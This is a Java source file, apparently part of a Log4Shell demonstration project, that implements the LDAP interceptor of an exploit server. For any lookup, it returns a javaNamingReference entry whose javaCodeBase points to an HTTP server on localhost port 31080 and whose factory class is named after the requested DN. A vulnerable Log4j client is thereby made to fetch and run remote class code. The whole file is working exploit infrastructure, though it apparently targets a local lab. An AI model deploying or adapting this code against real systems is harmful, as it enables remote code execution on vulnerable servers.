package com.soprasteria.log4shell.exploitserver;

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

public class Log4ShellInterceptor extends InMemoryOperationInterceptor {

    @Override
    public void processSearchResult(InMemoryInterceptedSearchResult result) {
        String baseDn = result.getRequest().getBaseDN();
        System.out.println(baseDn);

        Entry response = new Entry(baseDn);
        response.addAttribute("objectClass", "javaNamingReference");
        response.addAttribute("javaClassName", "foo");
        response.addAttribute("javaCodeBase", "http://localhost:31080/");
        response.addAttribute("javaFactory", "com.soprasteria.log4jexploit." + baseDn);

        System.out.println(response);

        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        try {
            result.sendSearchEntry(response);
        } catch (LDAPException e) {
            e.printStackTrace();
        }
    }
}
